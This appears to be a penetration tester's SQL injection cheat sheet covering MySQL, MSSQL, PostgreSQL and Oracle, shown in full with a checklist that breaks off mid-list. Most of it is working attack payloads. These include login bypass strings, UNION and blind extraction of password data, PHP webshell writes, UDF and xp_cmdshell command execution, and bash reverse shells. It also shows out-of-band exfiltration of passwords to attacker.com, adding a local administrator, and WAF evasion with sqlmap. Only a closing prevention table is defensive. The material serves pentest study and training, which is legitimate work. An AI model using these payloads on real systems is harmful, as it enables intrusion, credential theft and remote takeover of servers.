# SQL Injection

#SQLi #SQLInjection #injection #WebAppAttacks #RCE #xp_cmdshell #UDF #DBA #OSShell

## What is this?

SQL injection occurs when unsanitized user input is inserted directly into a SQL query, allowing an attacker to modify query logic, dump data, write files, or execute OS commands.

**Injection points:** GET/POST parameters, cookies, HTTP headers (X-Forwarded-For, User-Agent, Referer), JSON/XML body fields. Pairs with [[NoSQL Injection]], [[Web Attacks]], [[File Inclusion]].

**Categories:**

| Type | Subtype | Data returned? |
|------|---------|----------------|
| In-band | Union-based | Yes — in HTTP response |
| In-band | Error-based | Yes — in DB error message |
| Blind | Boolean-based | No — infer from true/false response diff |
| Blind | Time-based | No — infer from response delay |
| Out-of-band | DNS/HTTP callback | No — data exfil via OOB channel |

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Database/SQLMap\|sqlmap]] | Automated SQLi detection and exploitation; `--tamper` for WAF bypass |
| [[Tools/Database/ghauri\|ghauri]] | Lighter sqlmap alternative — fewer requests, less noisy |
| [[Tools/Web/Burpsuite\|Burp Suite]] | Manual testing + Repeater for blind injection; Collaborator for OOB |
| `interactsh-client` | Self-hosted OOB callback listener — [repo](https://github.com/projectdiscovery/interactsh) |

---

## Detection — Initial Probing

**Basic probes** — look for errors, changed output, or delays:

```bash
'
''
`
')
"))
' OR '1'='1
' OR 1=1-- -
' AND 1=2-- -
' OR SLEEP(5)-- -
```

**Comment syntax by DBMS:**

| DBMS | Comment styles |
|------|---------------|
| MySQL | `-- -` &nbsp;&nbsp; `#` &nbsp;&nbsp; `/**/` |
| MSSQL | `--` &nbsp;&nbsp; `/**/` |
| PostgreSQL | `--` &nbsp;&nbsp; `/**/` |
| Oracle | `--` |
| SQLite | `--` &nbsp;&nbsp; `/**/` |

> [!note] **SQLite dialect + RCE differ enough to warrant their own note.** No `#` comment, `||` for concat, `sqlite_master` instead of `information_schema`, no file-read primitive, and RCE via `ATTACH DATABASE` (webshell write) rather than `INTO OUTFILE`/`COPY … PROGRAM`. Full breakdown: [[Services/Database Services/SQLite|SQLite]].

**Signs of injection:**
- SQL syntax errors in response
- Application behavior changes between `1=1` and `1=2`
- Response delay on `SLEEP(5)` payload
- Extra data in response with UNION payloads

---

## Authentication Bypass

```sql
-- Login form: username field
admin'-- -
admin'#
' OR 1=1-- -
' OR '1'='1'-- -
') OR ('1'='1'-- -

-- If both fields injectable
' OR 1=1-- -    (username)
anything        (password)
```

---

## Union-Based SQLi — Full Methodology

### Step 1: Find column count

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- error here → 2 columns
```

Or use UNION NULLs:

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -   -- no error → 3 columns
```

### Step 2: Find printable columns

Replace NULLs with strings to find which columns are reflected in the response:

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

### Step 3: Extract data

```sql
-- Version / fingerprint
' UNION SELECT NULL,@@version,NULL-- -

-- Current user and database
' UNION SELECT NULL,user(),database()-- -

-- Combine multiple values into one column
' UNION SELECT NULL,concat(username,':',password),NULL FROM users-- -

-- If column must be numeric
' UNION SELECT NULL,NULL,1-- -
```

**Extract MANY rows in ONE request** — when the app only renders the *first* result row, aggregate every row into a single string instead of iterating with `LIMIT`:

```sql
-- MySQL: GROUP_CONCAT (default separator is comma; force newlines for readability)
' UNION SELECT NULL,(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users),NULL-- -

-- PostgreSQL / MSSQL: string_agg
' UNION SELECT NULL,(SELECT string_agg(username||':'||password, chr(10)) FROM users),NULL-- -   -- PgSQL
' UNION SELECT NULL,(SELECT STRING_AGG(username+':'+password, CHAR(10)) FROM users),NULL-- -    -- MSSQL 2017+

-- Oracle: LISTAGG
' UNION SELECT NULL,(SELECT LISTAGG(username||':'||password, chr(10)) WITHIN GROUP (ORDER BY username) FROM users),NULL FROM dual-- -
```

> [!tip] `GROUP_CONCAT` output is truncated at `group_concat_max_len` (default **1024 bytes**) — if the dump looks cut off, either raise it (`SET SESSION group_concat_max_len=1000000` where you have a stacked-query/privilege) or page with `LIMIT`/`OFFSET`.

---

## Database Enumeration (MySQL)

### Fingerprint

```sql
' UNION SELECT NULL,@@version,NULL-- -          -- MySQL/MSSQL
' UNION SELECT NULL,version(),NULL-- -          -- PostgreSQL
' UNION SELECT NULL,user(),database()-- -       -- user and DB
```

### List databases

```sql
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -
-- or:
SHOW DATABASES;
```

### List tables in a database

```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'-- -
```

### List columns in a table

```sql
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### Dump data

```sql
' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM target_db.users-- -
```

### Check privileges

```sql
' UNION SELECT NULL,super_priv,NULL FROM mysql.user WHERE user='root'-- -
' UNION SELECT NULL,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### Check secure_file_priv (file write restriction)

```sql
-- MySQL 5.7+/8.0 removed global_variables from information_schema — use the system var:
' UNION SELECT NULL,@@secure_file_priv,NULL-- -
-- (legacy 5.6: ...FROM information_schema.global_variables WHERE variable_name='secure_file_priv')
-- Empty value = no restriction, can write anywhere
-- A directory path = writes only allowed there
-- NULL = writes disabled entirely
```

---

## File Read / Write (MySQL)

**Requires:** `FILE` privilege + `secure_file_priv` allows target path.

### Read files

```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL-- -
```

### Write files

```sql
-- Proof of write
' UNION SELECT NULL,'test',NULL INTO OUTFILE '/var/www/html/proof.txt'-- -

-- PHP webshell (text mode — adds trailing newline, fine for PHP)
' UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -

-- INTO DUMPFILE vs INTO OUTFILE:
-- OUTFILE: text mode, adds newline after each row — breaks binary files
-- DUMPFILE: binary mode, single row, no added chars — use for binary payloads
' UNION SELECT NULL,0x3c3f706870...,NULL INTO DUMPFILE '/var/www/html/shell.php'-- -

-- Then access: http://target.com/shell.php?0=id
```

---

## RCE via SQLi

### Step 0 — Are you DBA? (that decides everything)

Landing as a **DBA / superuser** is the whole game: it unlocks direct OS command execution, not just data theft. Confirm your role first, then take the matching path below.

```sql
-- MySQL — DBA ≈ FILE priv + writable plugin dir (needed for UDF)
' UNION SELECT NULL,super_priv,NULL FROM mysql.user WHERE user=CURRENT_USER()-- -   -- 'Y' = SUPER
' UNION SELECT NULL,@@secure_file_priv,NULL-- -                                    -- '' (empty) = can write anywhere
-- MSSQL — 1 = sysadmin (full)
'; SELECT IS_SRVROLEMEMBER('sysadmin')-- -
-- PostgreSQL — 'on' = superuser
'; SELECT current_setting('is_superuser')-- -    (or: SELECT usesuper FROM pg_user WHERE usename=current_user)
-- Oracle — look for the DBA role
' UNION SELECT granted_role,NULL FROM user_role_privs-- -
```

| DBMS | If you're DBA/superuser → OS command path | If you're **not** DBA |
|---|---|---|
| **MySQL/MariaDB** | **UDF `sys_exec`/`sys_eval`** (below) — direct exec; or `INTO OUTFILE` webshell if `FILE`+writable webroot | webshell write only (needs `FILE` + writable web dir) |
| **MSSQL** | `xp_cmdshell` (re-enable it); `sp_OACreate` OLE if xp is locked | try to **regain sysadmin** (impersonation / TRUSTWORTHY, below) |
| **PostgreSQL** | `COPY … FROM/TO PROGRAM` (below) | need `pg_execute_server_program` role or a `dblink`/FDW pivot |
| **Oracle** | `DBMS_SCHEDULER.CREATE_JOB` (executable job) or `DBMS_JAVA` stored proc | limited to data extraction |

> [!tip] Don't have DBA? Data extraction is still worth everything — you're hunting for **reused credentials** (app config, `users` table hashes) that log in *elsewhere* as a privileged OS/AD account. SQLi→OS-shell is the loud path; SQLi→creds→SSH is often the quiet one.

### MySQL → Webshell

```sql
-- Find web root first
' UNION SELECT NULL,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/etc/nginx/sites-enabled/default'),NULL-- -

-- Write shell — note the NUMERIC key, not a bare word
' UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL INTO OUTFILE '/var/www/html/cmd.php'-- -
-- Then: http://target.com/cmd.php?0=id
```

> [!warning]
> Don't write `$_GET[cmd]` with a bare, unquoted key. PHP 7.2 deprecated the undefined-constant fallback and **PHP 8.0 made it a fatal `Error`** — the shell dies on every request. You usually can't use `'cmd'` either, since the quotes collide with the SQL string delimiter. A numeric key (`$_REQUEST[0]`) sidesteps both; alternatively hex-encode the whole payload and use `INTO DUMPFILE 0x...`.

### MySQL DBA → UDF `sys_exec` / `sys_eval` (direct command exec, no webroot)

The webshell above needs a writable, web-served directory. As **DBA** you can instead get **direct OS command execution** by loading the `lib_mysqludf_sys` shared library into the plugin dir and registering its functions — no web server required. This is the real MySQL "turn it on" RCE, and it's exactly what `sqlmap --os-shell` automates for MySQL.

**Preconditions:** `FILE` priv + `@@secure_file_priv` empty (write anywhere) + you can write to `@@plugin_dir`. Stacked queries (or a stacked-capable sink) make this far easier.

```sql
SELECT @@plugin_dir;                 -- where the .so/.dll must land, e.g. /usr/lib/mysql/plugin/
SELECT @@version_compile_os;         -- lnx vs win → pick the right prebuilt library

-- 1. Drop the precompiled UDF into the plugin dir (hex-encode the .so; DUMPFILE = binary-safe)
'; SELECT 0x7f454c46...<lib_mysqludf_sys.so bytes>... INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'-- -

-- 2. Register the functions from the library
'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'-- -
'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'-- -

-- 3. Execute — sys_eval returns stdout; sys_exec returns only the exit code (fire-and-forget)
SELECT sys_eval('id');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"');   -- reverse shell (pivot port)
```

> [!tip] The prebuilt library ships with both **sqlmap** (`/usr/share/sqlmap/data/udf/mysql/…` — XOR-encoded `.so_`/`.dll_`; sqlmap decodes and uploads it during `--os-shell`) and **Metasploit** (`mysql_udf_payload`). On Windows MySQL it's the matching `lib_mysqludf_sys.dll` into the install's `plugin` dir. Letting `sqlmap --os-shell` do the upload is almost always faster than hand-hexing the binary.

### MSSQL → xp_cmdshell

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';
'; EXEC xp_cmdshell 'powershell -enc <b64payload>'-- -

-- Check if already enabled
SELECT value FROM sys.configurations WHERE name='xp_cmdshell'
```

#### MSSQL — when `xp_cmdshell` is locked down

**Fallback A — OLE Automation (`sp_OACreate`).** A separate feature toggle from xp_cmdshell, so it often survives when xp is hardened. Runs a command via `WScript.Shell` — but it's **blind** (no stdout back), so use it for a reverse shell / file drop, not for reading output:

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
   EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
   DECLARE @o INT; EXEC sp_oacreate 'wscript.shell',@o OUT;
   EXEC sp_oamethod @o,'run',NULL,'cmd /c "powershell -enc <b64 reverse shell>"'-- -
```

**Fallback B — you're not sysadmin (regain it).** `sp_configure` needs sysadmin, so first try to *become* sysadmin:

```sql
-- Impersonate a sysadmin login you can EXECUTE AS (enumerate IMPERSONATE grants first)
'; EXECUTE AS LOGIN='sa'; SELECT IS_SRVROLEMEMBER('sysadmin')-- -
-- db_owner on a TRUSTWORTHY database owned by a sysadmin → escalate to sysadmin:
'; EXECUTE AS USER='dbo'; EXEC sp_addsrvrolemember 'yourlogin','sysadmin'-- -
-- Linked server with rpcout enabled often runs as sa on the remote instance:
'; EXEC('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE') AT [LINKEDSRV]-- -
```

> [!tip] Enumerate impersonation/linked paths with the `IMPERSONATE`-grant and `sysservers` queries in [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (MSSQL section) — the SQLi context and a direct `impacket-mssqlclient` login use the exact same escalation.

### PostgreSQL → COPY FROM PROGRAM (RCE)

```sql
-- COPY FROM needs an EXISTING table — create it first or the statement errors
CREATE TABLE cmd_output(line text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Reverse shell needs no table (COPY ... TO PROGRAM)
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'-- -
```

> [!note]
> Requires superuser or membership in `pg_execute_server_program` (PostgreSQL 11+). Runs as the `postgres` OS user, not root.

---

## Blind SQLi

### Boolean-Based

Identify true vs false response difference, then extract data character by character:

```sql
-- True/false test
' AND 1=1-- -    (true → normal response)
' AND 1=2-- -    (false → different response)

-- Extract DB name character by character
' AND SUBSTRING(database(),1,1)='a'-- -
' AND SUBSTRING(database(),1,1)='b'-- -

-- Extract user
' AND SUBSTRING(user(),1,1)='r'-- -

-- Extract password hash character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```

### Time-Based Blind

No visible response difference — use delays to infer:

```sql
-- MySQL
' OR SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- Oracle
' OR 1=1 AND DBMS_LOCK.SLEEP(5)-- -
```

---

## Error-Based SQLi

Force DB to return data inside error messages:

```sql
-- MySQL (extractvalue)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))-- -

-- MySQL (updatexml)
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -

-- MSSQL (CONVERT/CAST)
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
```

> [!warning] **`extractvalue`/`updatexml` truncate output to ~31 characters.** The XPATH error only echoes the first ~31 chars of your string, so a 32-hex MD5 or a 60-char bcrypt comes back **chopped**. Page long values with `SUBSTRING` and stitch them:
> ```sql
> ' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),1,31)))-- -
> ' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),32,31)))-- -
> ```
> The leading `0x7e` (`~`) marker eats one char, so read in 31-char windows. This is also **why `sqlmap --hex` hurts error-based** — hex doubles length against this fixed cap; use `--no-cast` instead (see [[Tools/Database/SQLMap|SQLMap]]).

---

## Out-of-Band (OOB) Exfil

Used when there's no visible response and time-based is unreliable. Exfil data via DNS or HTTP callback.

```sql
-- MySQL — LOAD_FILE with UNC path triggers DNS lookup (Windows MySQL only)
-- Data appears as subdomain in DNS query to your server
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))-- -
-- Use interactsh or Burp Collaborator to catch the DNS query

-- MySQL — SELECT INTO OUTFILE to UNC path (Windows, SMB outbound allowed)
' UNION SELECT NULL,user(),NULL INTO OUTFILE '\\\\attacker.com\\share\\out.txt'-- -

-- MSSQL — xp_dirtree forces SMB/DNS callback
'; EXEC master..xp_dirtree '\\attacker.com\test'-- -
'; EXEC master..xp_dirtree CONCAT('\\\\', (SELECT TOP 1 password FROM users), '.attacker.com\\x')-- -

-- MSSQL — xp_fileexist alternative
'; EXEC xp_fileexist '\\attacker.com\test'-- -

-- PostgreSQL — COPY to remote (if outbound connections allowed)
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://attacker.com/?d=$(cat)'-- -

-- Oracle — UTL_HTTP (see Oracle section)
-- Oracle — UTL_DNS_RESOLVE
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1)||'.attacker.com'),NULL FROM dual-- -
```

> [!tip]
> Use Burp Collaborator or `interactsh-client` to receive OOB callbacks. DNS callbacks work even through strict egress filters that block HTTP.

---

## Multi-DB Cheat Sheet

| | MySQL | MSSQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| **Version** | `@@version` | `@@VERSION` | `version()` | `SELECT banner FROM v$version` |
| **Current user** | `user()` | `SYSTEM_USER` | `current_user` | `USER` |
| **Current DB** | `database()` | `DB_NAME()` | `current_database()` | `SYS_CONTEXT('USERENV','DB_NAME') FROM dual` |
| **List DBs** | `information_schema.schemata` | `sys.databases` | `pg_database` | `v$database` |
| **List tables** | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `ALL_TABLES` |
| **List columns** | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `ALL_TAB_COLUMNS` |
| **Sleep** | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `DBMS_LOCK.SLEEP(5)` |
| **String concat** | `concat(a,0x3a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
| **File read** | `LOAD_FILE('/etc/passwd')` | `BULK INSERT` / `OPENROWSET` | `COPY TO` | `UTL_FILE` |
| **RCE** | UDF `sys_exec` (DBA) / `INTO OUTFILE` webshell | `xp_cmdshell` / `sp_OACreate` OLE | `COPY … FROM PROGRAM` | `DBMS_SCHEDULER` / Java |

---

## HTTP Header Injection

Headers are often logged to a DB (analytics, audit logs, session tracking). Test each one as an injection point.

**Common injectable headers:**

```bash
User-Agent: Mozilla' OR 1=1-- -
X-Forwarded-For: 1' OR 1=1-- -
Referer: ' OR 1=1-- -
X-Custom-IP-Authorization: 1' OR 1=1-- -
```

**In Burp — modify headers directly in Repeater:**

```http
GET /dashboard HTTP/1.1
Host: target.com
User-Agent: ' AND SLEEP(5)-- -
X-Forwarded-For: 1' UNION SELECT NULL,user(),NULL-- -
Referer: ' AND 1=2-- -
```

**sqlmap — test specific header:**

```bash
# Inject into User-Agent
sqlmap -u "http://target.com/" --level=3 --batch
# level=3+ enables header injection testing automatically

# Manually specify header injection point with *
sqlmap -u "http://target.com/" -H "User-Agent: *" --batch
sqlmap -u "http://target.com/" -H "X-Forwarded-For: *" --batch
```

**Signs of header injection:**
- Login/dashboard page behavior changes
- Different error when header contains `'`
- Delayed response with `SLEEP(5)` in header
- App tracks IP/UA and reflects it back somewhere

---

## JSON / API Body Injection

Referenced in the checklist but easy to skip — REST and GraphQL backends concatenate JSON values into SQL just as often as form handlers do.

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"filter":"laptop' UNION SELECT NULL,user(),NULL-- -","limit":10}
```

```bash
# Escape the quote for JSON validity — \" in the body, ' in the SQL
curl -s -X POST https://target.com/api/search \
  -H 'Content-Type: application/json' \
  -d '{"filter":"x'"'"' OR 1=1-- -","limit":10}'

# sqlmap against a JSON body — mark the point with *
sqlmap -u "https://target.com/api/search" \
  --data '{"filter":"*","limit":10}' \
  --headers="Content-Type: application/json" --batch
```

Injectable spots people miss in APIs:

| Location | Why it's reachable |
|---|---|
| Nested object values | `{"user":{"id":"1' OR 1=1-- -"}}` — flattened into a query server-side |
| Array elements | `{"ids":["1","2' UNION..."]}` — often joined into an `IN (…)` clause |
| Sort / order fields | `{"sort":"name; DROP…"}` — **identifiers can't be parameterised**, so these are frequently concatenated |
| `limit` / `offset` | Numeric context, no quotes needed to break out |

> [!tip]
> `ORDER BY` and column/table names are the highest-yield API targets. Prepared statements cannot parameterise an identifier, so even a codebase that uses them everywhere else usually string-builds the sort clause.

---

## Stacked Queries

Execute multiple SQL statements separated by `;`. Allows chaining arbitrary queries (DDL, xp_cmdshell, INSERT).

**Support by DBMS:**

| DBMS | Stacked queries | Notes |
|------|----------------|-------|
| MSSQL | Yes | Full support |
| PostgreSQL | Yes | Full support |
| MySQL | Conditional | `mysqli::query()` blocks stacking (only `multi_query()` allows it); `PDO_MySQL` with emulated prepares often permits it |
| Oracle | No | Not supported |

**Syntax:**

```sql
-- Basic test
'; SELECT SLEEP(5)-- -
1; SELECT 1-- -

-- MSSQL: enable and run xp_cmdshell in one chain
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- -

-- MSSQL: add admin user
'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add'-- -

-- PostgreSQL: create table and write data
'; CREATE TABLE cmd_out(output text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out-- -

-- MySQL (if stacking works): update data
'; UPDATE users SET password='hacked' WHERE username='admin'-- -
```

**sqlmap stacked queries:**

```bash
sqlmap -u "http://target.com/page?id=1" --technique=S --batch
```

---

## Second-Order SQLi

Input is stored safely (no immediate injection) but later retrieved and used in another SQL query without sanitization.

**How it works:**
1. Register username: `admin'-- -` → stored cleanly in DB
2. Password change function: `UPDATE users SET password='x' WHERE username='admin'-- -'`
3. The stored payload fires in the second query, truncating to `WHERE username='admin'`

**Why it's tricky:**
- First request appears safe — no error, no response difference
- Injection fires in a completely different feature/endpoint
- Hard to detect with automated scanners

**Test methodology:**
```bash
1. Register/create account with payloads in name fields:
   - admin'-- -
   - test' OR 1=1-- -
   - '); DROP TABLE users-- -

2. Look for features that use that stored data in queries:
   - Password change
   - Profile update
   - Search using stored preferences
   - Email/notification that queries by stored value

3. Trigger the secondary feature and observe behavior
   - Errors, wrong data returned, auth bypass
```

**sqlmap — test second-order:**

```bash
# Tell sqlmap where data is submitted (1st request) and where it's used (2nd)
sqlmap -r register_request.txt --second-url="http://target.com/profile" --batch
```

---

## Oracle Payloads

Oracle differs significantly — all `SELECT` statements require a `FROM` clause (`FROM dual` for no-table queries).

**Fingerprint:**

```sql
-- Oracle requires FROM in every SELECT — a UNION that only works WITH "FROM dual" = Oracle
' UNION SELECT NULL FROM dual-- -
-- (a plain ' UNION SELECT NULL-- - would error on Oracle but succeed on MySQL/MSSQL)
```

**Basic enumeration:**

```sql
-- Version
' UNION SELECT banner,NULL FROM v$version-- -

-- Current user
' UNION SELECT user,NULL FROM dual-- -

-- Current database
' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM dual-- -

-- List tables (current user)
' UNION SELECT table_name,NULL FROM user_tables-- -

-- List all accessible tables
' UNION SELECT table_name,owner FROM all_tables-- -

-- List columns
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -

-- Dump data
' UNION SELECT username||':'||password,NULL FROM users-- -
```

**Blind time-based:**

```sql
' AND 1=1 AND DBMS_LOCK.SLEEP(5)-- -
' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1-- -
```

**Error-based:**

```sql
' AND 1=CAST((SELECT user FROM dual) AS int)-- -
' AND TO_NUMBER((SELECT user FROM dual))=1-- -
```

**Privileges:**

```sql
' UNION SELECT privilege,NULL FROM session_privs-- -
' UNION SELECT granted_role,NULL FROM session_roles-- -
```

**File access (UTL_FILE — requires directory object):**

```sql
-- Check if UTL_FILE accessible (error-based discovery)
' AND UTL_FILE.FOPEN('DIRECTORY','file.txt','R') IS NOT NULL-- -
```

**OOB via UTL_HTTP:**

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://<AttackerIP>/'||user),NULL FROM dual-- -
```

---

## Filter Bypass / WAF Evasion

### Case variation
```sql
SeLeCt UsEr()
```

### Inline comments
```sql
SE/**/LECT user/**/()
' UN/**/ION SE/**/LECT NULL-- -
```

### URL encoding
```bash
%27 = '
%20 = space
%2B = +
```

### Double URL encoding
```bash
%2527 = %27 = '
```

### Whitespace alternatives
```sql
' UNION%09SELECT%09NULL-- -      -- tab
' UNION%0ASELECT%0ANULL-- -      -- newline
' UNION(SELECT(NULL))-- -        -- parentheses instead of spaces
```

### String obfuscation
```sql
-- Hex encoding
SELECT 0x61646d696e   -- decodes to 'admin'
WHERE username=0x61646d696e

-- CHAR() function
SELECT CHAR(97,100,109,105,110)   -- 'admin'
```

### Logic substitution
```sql
-- Instead of OR 1=1
' OR 2>1-- -
' OR 'a'='a'-- -

-- Instead of =
' OR username LIKE 'admin'-- -
' OR username BETWEEN 'a' AND 'z'-- -
```

### Scientific notation (numeric bypass)
```sql
id=1e0    -- equals 1
id=1.0    -- equals 1
```

---

## sqlmap

### Basic usage

```bash
# Test GET parameter
sqlmap -u "http://target.com/page?id=1" --batch

# Test POST parameter
sqlmap -u "http://target.com/login" --data "user=foo&pass=bar" --batch

# With cookie auth
sqlmap -u "http://target.com/page?id=1" --cookie "session=<value>" --batch

# From Burp saved request file
sqlmap -r request.txt --batch
```

### Enumeration

```bash
# Get current DB
sqlmap -u "http://target.com/page?id=1" --current-db

# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# List tables in a DB
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump all
sqlmap -u "http://target.com/page?id=1" --dump-all
```

### File operations

```bash
# Read file
sqlmap -u "http://target.com/page?id=1" --file-read /etc/passwd

# Write webshell
sqlmap -u "http://target.com/page?id=1" --file-write ./shell.php --file-dest /var/www/html/shell.php
```

### OS shell / RCE

```bash
# Interactive OS shell — automates the per-DBMS path from "RCE via SQLi" above:
#   MySQL/PostgreSQL → uploads a UDF / uses COPY FROM PROGRAM   MSSQL → auto-enables xp_cmdshell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Single command instead of an interactive shell
sqlmap -u "http://target.com/page?id=1" --os-cmd "whoami"

# OOB: pop a Meterpreter/VNC via Metasploit (needs msf; great when the shell is blind)
sqlmap -u "http://target.com/page?id=1" --os-pwn

# sqlmap shell (SQL-level, not OS)
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

> [!note] `--os-shell` needs **DBA** and usually **stacked-query** support; add `--technique=E` or `--dbms`/`--web-root` hints if it struggles. Confirm privilege first: `--is-dba`, `--privileges`, `--current-user`. No DBA → `--os-shell` will fail; fall back to `--file-write` (webshell) or dump-and-reuse-creds.

### Tuning

```bash
# Specify injection technique
--technique=U        # Union
--technique=B        # Boolean blind
--technique=T        # Time blind
--technique=E        # Error-based
--technique=BEUSTQ   # All (B=boolean E=error U=union S=stacked T=time Q=inline)

# Specify DBMS to skip detection
--dbms=mysql

# Increase threads / level / risk
--threads=5
--level=5            # More injection points tested (default 1)
--risk=3             # More aggressive payloads (default 1, can break apps)

# WAF bypass
--tamper=space2comment
--tamper=between,randomcase,space2comment
--random-agent       # Random User-Agent
--delay=1            # Add delay between requests
--proxy=http://127.0.0.1:8080   # Route through Burp

# Skip URL encoding
--skip-urlencode
```

### Common tamper scripts

| Tamper | Effect |
|--------|--------|
| `space2comment` | Replaces spaces with `/**/` |
| `randomcase` | Randomizes keyword case |
| `between` | Replaces `>` with `BETWEEN x AND y` |
| `charencode` | URL-encodes payload |
| `charunicodeescape` | Unicode-escapes characters |
| `equaltolike` | Replaces `=` with `LIKE` |
| `base64encode` | Base64-encodes payload |

---

## Attack Chains

| Chain | Steps |
|-------|-------|
| SQLi → Cred dump → Admin panel | Dump `users` table → crack/reuse hash → login |
| SQLi → File write → Webshell | `INTO OUTFILE` → browse to shell → RCE |
| SQLi → MSSQL → xp_cmdshell → Shell | Enable + exec → reverse shell |
| SQLi → LOAD_FILE → Config files | Read `config.php` / `.env` → DB creds / secrets |
| SQLi → Cred dump → SSH/RDP | Crack hashes → lateral movement |
| SQLi → PostgreSQL → COPY FROM PROGRAM | OS command exec → reverse shell |

---

## Prevention (Know the Defenses)

What you're up against, and where each control still leaks — useful for the remediation section of a report.

| Control | Stops | Residual gap |
|---|---|---|
| **Parameterised queries / prepared statements** | All value-context injection | **Cannot parameterise identifiers** — table/column names, `ORDER BY`, `LIMIT` in some drivers. Those stay string-built |
| **Stored procedures** | Only if they parameterise internally | A proc that concatenates its arguments into dynamic SQL is just as injectable |
| **ORM / query builder** | Most common cases | Raw-query escape hatches (`.raw()`, `.whereRaw()`, `@Query`) reintroduce it |
| **Allowlist input validation** | Identifier contexts prepared statements can't cover | Only as good as the list; the right control for `ORDER BY` |
| **Least-privilege DB account** | Doesn't stop injection — caps the blast radius | Kills `FILE`/`INTO OUTFILE`, `xp_cmdshell`, `COPY FROM PROGRAM` |
| **`secure_file_priv` / disabled `xp_cmdshell`** | The RCE escalation path | Data extraction is untouched |
| **WAF** | Naive payloads | Every technique in [[#Filter Bypass / WAF Evasion]] — a detection layer, not a fix |
| **Escaping user input by hand** | Almost nothing reliably | Charset tricks, numeric context (no quotes to escape), second-order |

> [!warning]
> "We use prepared statements" is not, by itself, a valid remediation claim — always test `ORDER BY`, sort/direction parameters, and any dynamic table or column name. Those are the fields a parameterised codebase still concatenates, and they're where injection survives in otherwise-clean applications.

---

## Quick Reference Checklist

```bash
1. Identify injection points
   - All GET/POST params, cookies, headers
   - JSON body fields

2. Probe for injection
   - Single quote: '
   - Boolean: ' AND 1=1-- - vs ' AND 1=2-- -
   - Time: ' OR SLEEP(5)-- -

3. Determine injection type
   - Error visible → error-based
   - Different output → union or boolean
   - Only timing → time-based blind

4. Union-based: find column count
